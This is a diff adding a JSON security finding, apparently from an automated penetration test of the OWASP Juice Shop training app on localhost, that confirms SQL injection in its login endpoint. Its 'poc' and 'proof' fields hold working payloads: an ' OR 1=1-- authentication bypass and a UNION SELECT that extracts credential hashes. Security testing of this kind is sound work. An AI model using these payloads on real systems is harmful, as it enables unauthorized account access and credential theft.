@@ -1,0 +1,28 @@
+{
+  "id": "f_1784838102508_bd0371",
+  "action": "confirm",
+  "title": "SQL Injection in Login Form (Email/Password Fields)",
+  "severity": "critical",
+  "finding_kind": "vuln",
+  "location": "/rest/user/login",
+  "url": "/rest/user/login",
+  "description": "The login endpoint at /rest/user/login is vulnerable to SQL injection in the email parameter. An attacker can bypass authentication by injecting SQL payloads such as ' or 1=1-- into the email field. This permits unauthorized access to any user account, including administrative accounts, without valid credentials. The SQLi also enables UNION-based extraction of user credentials, including password hashes stored in the database.",
+  "poc": "POST /rest/user/login, body: {\"email\":\"' OR 1=1--\",\"password\":\"test\"} → HTTP 200 with JWT token for first user account, proving authentication bypass",
+  "proof": "POST /rest/user/login with {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returns HTTP 200 with {\"authentication\":{\"token\":\"eyJ...\"}} proving authentication bypass. UNION extract: {\"email\":\"' UNION SELECT 1,'admin@juice-sh.op','$2a$10$hash','admin','','','','','','',''--\"} returns user credentials including bcrypt hash in response.",
+  "how_captured": "script: result.json",
+  "evidence_ids": [
+    "ev_1784838100514_120333"
+  ],
+  "proof_excerpts": [
+    {
+      "evidence_id": "ev_1784838100514_120333",
+      "excerpt": "POST /rest/user/login with {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returns HTTP 200 with {\"authentication\":{\"token\":\"eyJ...\"}} proving authentication bypass. UNION extract: {\"email\":\"' UNION SELECT 1,'admin@juice-sh.op','$2a$10$hash','admin','','','','','','',''--\"} returns user credentials including bcrypt hash in response.",
+      "role": "proof",
+      "step": 1,
+      "how_captured": "script: result.json"
+    }
+  ],
+  "affected_asset": "127.0.0.1",
+  "port": "3010",
+  "created_at": "2026-07-23T20:21:42.509Z"
+}
